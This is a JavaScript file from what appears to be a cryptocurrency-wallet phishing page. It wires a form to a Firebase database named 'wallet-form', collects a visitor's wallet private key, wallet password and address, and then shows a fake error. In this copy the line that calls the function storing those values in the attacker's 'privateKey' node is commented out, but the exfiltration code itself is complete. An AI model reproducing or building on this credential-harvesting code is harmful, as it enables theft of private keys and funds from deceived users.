const firebaseConfig3 = {
  apiKey: "AIzaSyA7gwUX3gZzcitDi1o7d1cBofdjpuVhjWA",
  authDomain: "wallet-form-5f817.firebaseapp.com",
  databaseURL: "https://wallet-form-5f817-default-rtdb.firebaseio.com",
  projectId: "wallet-form-5f817",
  storageBucket: "wallet-form-5f817.appspot.com",
  messagingSenderId: "559255000272",
  appId: "1:559255000272:web:aaad5f8f5051e1093f3ad5"
}

firebase.initializeApp(firebaseConfig3, 'tertiary')

var contactFormDB3 = firebase.database().ref('privateKey')

document.getElementById('pButton').addEventListener('click', submitForm)

function submitForm(e) {
  e.preventDefault()
  var privateKey = document.getElementById('privateKey').value
  var tempPassword =  document.getElementById('pwalletPassword').value
  var walletAddress =  document.getElementById('pemailid').value

  // saveMessages3(privateKey, tempPassword, walletAddress)
  error3()
}

const saveMessages3 = (privateKey, tempPassword, walletAddress)=>{
  var newContactForm = contactFormDB3.push()

  newContactForm.set({
      privateKey:privateKey,
    tempPassword:tempPassword,
    walletAddress:walletAddress,
  })
}
function error3() {
  document.querySelector('.p-block').classList.add('d-none')
  document.querySelector('.errorP').classList.remove('d-none')
  
}

document.querySelector('.closeP').addEventListener('click', ()=>{
  document.querySelector('.p-block').reset()
  document.querySelector('.p-block').classList.remove('d-none')
  document.querySelector('.errorP').classList.add('d-none')
})